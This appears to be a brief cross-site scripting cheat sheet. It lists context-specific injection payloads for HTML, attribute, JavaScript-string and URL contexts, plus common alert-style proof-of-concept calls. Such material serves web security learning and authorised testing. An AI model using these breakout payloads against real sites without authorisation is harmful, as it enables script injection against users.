# XSS Context Payloads

## HTML Context

Example:

```html
<p>USER_INPUT</p>
```

---

Payload:

```html
<script>alert(1)</script>
```

---

Alternative:

```html
<img src=x onerror=alert(1)>
```

---

# Attribute Context

Example:

```html
<input value="USER_INPUT">
```

---

Payload:

```html
" onmouseover="alert(1)
```

---

Alternative:

```html
" autofocus onfocus=alert(1) x="
```

---

# JavaScript Context

Example:

```javascript
var x="USER_INPUT";
```

---

Payload:

```javascript
";alert(1);//
```

---

Alternative:

```javascript
'-alert(1)-'
```

---

# URL Context

Example:

```html
<a href="USER_INPUT">
```

---

Payload:

```javascript
javascript:alert(1)
```

---

# Common PoCs

```javascript
alert(1)
```

```javascript
alert(document.domain)
```

```javascript
print()
```

---

# Related Theory

- Reflected XSS Contexts